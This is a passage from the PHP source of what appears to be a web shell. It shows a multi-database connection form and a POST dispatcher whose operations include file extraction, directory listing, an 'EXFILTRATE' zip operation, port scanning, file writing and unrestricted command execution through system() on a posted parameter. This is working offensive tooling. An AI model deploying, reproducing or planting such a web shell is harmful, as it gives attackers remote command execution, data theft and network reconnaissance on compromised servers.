                                        "value"    => "oci",
                                        "label"    => "Oracle",
                                        "disabled" => !extension_loaded("oci8") && !extension_loaded("pdo_oci"),
                                    ],
                                    [
                                        "value"    => "mongodb",
                                        "label"    => "MongoDB",
                                        "disabled" => !extension_loaded("mongo") && !extension_loaded("mongodb"),
                                    ],
                                    [
                                        "value"    => "ibm",
                                        "label"    => "IBM DB2",
                                        "disabled" => !extension_loaded("ibm_db2") && !extension_loaded("pdo_ibm"),
                                    ],
                                    [
                                        "value"    => "firebird",
                                        "label"    => "Firebird/Interbase",
                                        "disabled" => !extension_loaded("interbase") &&
                                                      !extension_loaded("pdo_firebird"),
                                    ],
                                    [
                                        "value"    => "odbc",
                                        "label"    => "ODBC",
                                        "disabled" => !extension_loaded("odbc") && !extension_loaded("pdo_odbc"),
                                    ],
                                    [
                                        "value"    => "informix",
                                        "label"    => "Informix",
                                        "disabled" => !extension_loaded("pdo_informix"),
                                    ],
                                    [
                                        "value"    => "sybase",
                                        "label"    => "Sybase",
                                        "disabled" => !extension_loaded("sybase") &&
                                                      !extension_loaded("mssql") &&
                                                      !extension_loaded("pdo_dblib"),
                                    ],
                                    [
                                        "value"    => "raw",
                                        "label"    => "Raw PDO connection string",
                                        "disabled" => !extension_loaded("pdo"),
                                        "selected" => true,
                                    ],
                                ],
                                true,
                                "Database driver not available.",
                            ),
                            makeInput(
                                "text",
                                "Host",
                                "__PARAM_2__",
                                "localhost",
                                "The host to connect to (default: localhost)",
                            ),
                            makeInput(
                                "number",
                                "Port",
                                "__PARAM_3__",
                                "3306",
                                "
                                    The port to connect to, default depend on the database
                                    <ul class='text-sm text-zinc-500 list-disc list-inside'>
                                        <li>MySQL (default: 3306)</li>
                                        <li>CUBRID (default: 30000)</li>
                                        <li>PostgreSQL (default: 5432)</li>
                                        <li>SQLite (default: None)</li>
                                        <li>SQL Server (default: 1433)</li>
                                        <li>Oracle (default: 1521)</li>
                                        <li>MongoDB (default: 27017)</li>
                                        <li>IBM DB2 (default: 50000)</li>
                                        <li>Firebird/Interbase (default: 3050)</li>
                                        <li>ODBC (default: None)</li>
                                        <li>Informix (default: 9800)</li>
                                        <li>Sybase (default: 5000)</li>
                                    </ul>",
                            ),
                            makeInput(
                                "text",
                                "Username",
                                "__PARAM_4__",
                                "admin",
                                "The username to connect with.",
                                true,
                            ),
                            makeInput(
                                "password",
                                "Password",
                                "__PARAM_5__",
                                "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                                "The password to connect with.",
                                true,
                            ),
                            makeInput(
                                "text",
                                "Database",
                                "__PARAM_6__",
                                "ExampleDB",
                                "The database to connect to.",
                            ),
                            makeInput(
                                "text",
                                "Charset",
                                "__PARAM_7__",
                                "utf8",
                                "The charset to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Service name",
                                "__PARAM_8__",
                                "orcl",
                                "The service name to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "SID",
                                "__PARAM_9__",
                                "orcl",
                                "The SID to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Options",
                                "__PARAM_10__",
                                "ssl=true",
                                "The options to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Role",
                                "__PARAM_11__",
                                "SYSDBA",
                                "The role to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Dialect",
                                "__PARAM_12__",
                                "3",
                                "The dialect to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Protocol",
                                "__PARAM_13__",
                                "onsoctcp",
                                "The protocol to use for the connection.",
                            ),
                            makeCheckbox(
                                "__PARAM_14__",
                                "Enable scrollable cursors",
                                "Enable scrollable cursors for the connection.",
                                true,
                                "1",
                            ),
                            makeInput(
                                "text",
                                "ODBC driver",
                                "__PARAM_15__",
                                "ODBC Driver 17 for SQL Server",
                                "The ODBC driver to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Raw connection string",
                                "__PARAM_16__",
                                "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
                                "The raw connection string to use for the connection.",
                            ),
                            makeInput(
                                "text",
                                "Server",
                                "__PARAM_17__",
                                "ol_informix1170",
                                "The Informix server name to use for the connection.",
                            ),
                            makeInput(
                                "textarea",
                                "Query",
                                "__PARAM_18__",
                                "SHOW DATABASES",
                                "The query to run against the database. Leave empty to perform a connection test.",
                            ),
                            makeInput(
                                "text",
                                "Collection",
                                "__PARAM_19__",
                                "users",
                                "The collection to query against for MongoDB.",
                            ),
                            '<script>
                                function hideAll() {
                                    for (let i = 2; i <= 17; i++) {
                                        document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
                                    }
                                    
                                    document.getElementById(`__PARAM_19__-container`).classList.add(`hidden`);
                                }
                                
                                function showRange(start, end) {
                                    for (let i = start; i <= end; i++) {
                                        document.getElementById(`__PARAM_${i}__-container`).classList.remove(`hidden`);
                                    }
                                }
                                
                                hideAll();
                                showRange(16, 16);
                                const select = document.getElementById(`__PARAM_1__`);
                                select.addEventListener(`change`, (event) => {
                                   const value = event.target.value;
                                   hideAll()
                                    
                                   switch (value) {
                                        case `raw`:
                                            showRange(16, 16);
                                            break;
                                        case `mysql`:
                                        case `cubrid`:
                                            showRange(2, 7);
                                            break;
                                        case `pgsql`:
                                        case `sqlsrv`:
                                        case `ibm`:
                                        case `sybase`:
                                            showRange(2, 6);
                                            break;
                                        case `sqlite`:
                                            showRange(2, 2);
                                            showRange(4, 5);
                                            break;
                                        case `oci`:
                                            showRange(2, 5);
                                            showRange(8, 9);
                                            break;
                                        case `mongodb`:
                                            showRange(2, 6);
                                            showRange(10, 10);
                                            showRange(19, 19);
                                            break;
                                        case `firebird`:
                                            showRange(2, 7);
                                            showRange(11, 12);
                                            break;
                                        case `odbc`:
                                            showRange(2, 6);
                                            showRange(15, 15);
                                            break;
                                        case `informix`:
                                            showRange(2, 6);
                                            showRange(13, 14);
                                            showRange(17, 17);
                                            break;
                                   }
                                });
                            </script>',
                        ],
                    ),
                ],
                $page,
            );
            break;
    }

    echo $content;

    if (isPost() && !in_array($_POST["__OPERATION__"], $isolated_ops)) {
        openCommandOutputScreen();
    }
}

if (isPost()) {
    $operation = $_POST["__OPERATION__"];

    switch ($operation) {
        case $LOGIN:
            handleLogin();
            break;
        case $FILE_EXTRACTION_PREVIEW:
        case $FILE_EXTRACTION:
            handleFileExtraction();
            break;
        case $DIRECTORY_LISTING:
            handleDirectoryListing();
            break;
        case $EXFILTRATE:
            handleCreateZip();
            break;
        case $PORT_SCAN:
            handlePortScan();
            break;
        case $WRITE_FILE:
            handleWriteFile();
            break;
        case $RUN_COMMAND:
            system($_POST["__PARAM_1__"]);
            break;
        case $QUERY_DATABASES:
            connectAndQueryDatabase(
                $_POST["__PARAM_1__"],
                $_POST["__PARAM_4__"],
                $_POST["__PARAM_5__"],
                $_POST["__PARAM_2__"],
                $_POST["__PARAM_3__"],
                $_POST["__PARAM_8__"],
                $_POST["__PARAM_9__"],
                $_POST["__PARAM_6__"],
                $_POST["__PARAM_7__"],
                $_POST["__PARAM_10__"],
                $_POST["__PARAM_11__"],
                $_POST["__PARAM_12__"],
                $_POST["__PARAM_15__"],
                $_POST["__PARAM_17__"],
                $_POST["__PARAM_13__"],
                $_POST["__PARAM_14__"],
                $_POST["__PARAM_16__"],
                $_POST["__PARAM_18__"],
                $_POST["__PARAM_19__"],
            );
            break;
        default:
            echo "Unrecognized operation '$operation'";
            break;
    }
}

// Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
if (!isPost() &&
    (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
    $_POST["__OPERATION__"] !== $LOGIN) {
    closeCommandOutputScreen();
}
?>